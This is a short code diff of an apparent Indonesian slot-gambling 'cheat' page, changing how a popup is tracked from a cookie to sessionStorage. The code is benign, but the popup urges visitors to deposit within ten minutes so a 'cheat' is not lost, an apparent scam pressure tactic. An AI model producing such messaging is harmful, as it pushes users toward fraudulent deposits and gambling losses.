@@ -6,8 +6,8 @@
         <title>Robopragma Hitamslot (2024)</title>
 <script>
     window.onload = function() {
-        // Periksa apakah sudah ada cookie yang menandakan pengguna telah melihat pesan ini sebelumnya
-        if (!document.cookie.includes("popupShown")) {
+        // Periksa apakah alert sudah pernah ditampilkan selama sesi ini
+        if (!sessionStorage.getItem("popupShown")) {
             // Jika belum, tampilkan pop-up alert
             showAlert();
         }
@@ -17,13 +17,8 @@
         // Tampilkan pop-up alert
         alert("HARAP DIBACA!\n\nSetelah Melakukan Aktivasi Lakukan Deposit Dalam Waktu 10 Menit agar Cheat Tidak Hilang!");
 
-        // Setelah alert ditampilkan, hapus cookie agar alert muncul lagi saat halaman dimuat kembali
-        var now = new Date();
-        now.setTime(now.getTime() + 1 * 3600 * 1000); // Cookie akan kadaluarsa dalam 1 jam
-        document.cookie = "popupShown=true; expires=" + now.toUTCString() + "; path=/";
-
-        // Refresh halaman
-        location.reload();
+        // Tandai bahwa pop-up sudah ditampilkan dengan menyimpan nilai dalam sessionStorage
+        sessionStorage.setItem("popupShown", "true");
     }
 </script>
 </head>
